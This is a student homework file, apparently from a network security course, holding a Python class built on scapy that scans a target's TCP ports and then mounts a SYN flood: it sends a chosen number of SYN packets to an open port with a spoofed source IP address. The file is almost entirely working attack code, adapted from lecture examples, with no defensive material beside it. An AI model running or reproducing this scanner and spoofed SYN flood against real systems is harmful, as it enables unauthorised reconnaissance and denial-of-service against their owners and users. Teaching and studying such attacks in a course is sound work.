# Homework Number: 09
# Name: Tingzhang Li
# ECN Login: li3402
# Due Date: 3/29/2022

#!/usr/bin/env python3

import socket
from scapy.all import *

class TcpAttack:
    def __init__(self,spoofIP,targetIP):
        """
        spoofIP (str): IP address to spoof
        targetIP (str): IP address of the target computer to be attacked
        """
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self,rangeStart,rangeEnd):
        """
        rangeStart (int): The first port in the range of ports being scanned.
        rangeEnd (int): The last port in the range of ports being scanned
        No return value, but writes open ports to openports.txt
        """
        # The following code is modified from Lecture 16's code provided
        # by Professor Avinash Kak in port_scan.py
        #open_ports = [] 
        FILEOUT = open('openports.txt', 'w')
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            sock.settimeout(0.5) 
            try:
                sock.connect( (self.targetIP, testport) )
                #open_ports.append(testport)
                FILEOUT.write('{}\n'.format(testport))
            except:
                pass
        FILEOUT.close()
        #print(open_ports)

    def attackTarget(self,port,numSyn):
        """
        port (int): The port that the attack will use
        numSyn (int): Number of SYN packets to send to target IP address and port.
        If the port is open, perform DoS attack and return 1. Otherwise return 0.
        """
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        sock.settimeout(0.5)
        try:
            # vertify if the port is open and if so connect the port
            sock.connect((self.targetIP, port)) 
        except:
            return 0  # return 0 if the port is not opend
        # The following code is modified from Lecture 16's code provided
        # by Professor Avinash Kak in DoS5.py, in this implmentation, 
        # it send numSyn of SYN packet to the selected port
        for i in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags='S', sport=RandShort(), dport=port)
            packet = IP_header / TCP_header
            send(packet)
        return 1  # return 1 when the attack was mounted      
